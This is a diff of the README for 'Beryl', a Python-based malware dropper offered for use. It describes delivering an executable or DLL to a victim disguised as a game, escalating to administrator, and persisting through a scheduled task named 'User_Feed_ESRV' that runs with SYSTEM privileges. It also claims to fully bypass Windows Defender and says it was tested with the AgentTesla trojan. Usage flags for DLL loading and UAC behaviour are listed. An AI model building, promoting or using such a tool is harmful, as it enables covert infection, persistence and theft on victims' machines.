@@ -4,19 +4,19 @@
 Greetings
 --------------------
 
-Beryl delivers your PE (exe or dll) straight to the victim in form of a game or a no gui 
-
+Beryl delivers your PE (exe or dll) straight to the victim in form of a game or a no gui and makes it run as admin by trying to priv escalate or just by being run as admin
 
 
 persistance feature:
 ---------------------
-it use the task schedualer to make a the PE run at logon ,also the PE will run with the highest privilege available at each startup(SYSTEM or Nt/AUthority System)
+it use the task scheduler to create a task "User_Feed_ESRV" that runs the PE run at logon ,also the PE will run with the highest privilege available at each startup(SYSTEM or Nt/AUthority System)
 
 ps: tried this with an AgentTesla trojan PE and it worked fine
 
 tested on windows 10 and 11 fully bypass windows defender
 
 Setup:
+-------------------
 
 pip install -r requirements.txt 
 
@@ -35,7 +35,7 @@ usage: Beryl.py [-h]
 
 -dll "function" (name of function to run with the dll file)
 
--uac makes Beryl run as Uac by default (if UAC and  user  doesn t execute as admin payload won t be injected won't run)
+-uac makes Beryl run as Uac by default (if UAC and  user  doesn t execute as admin payload won t be injected and won t run)
 
 To Do :
 ---------------
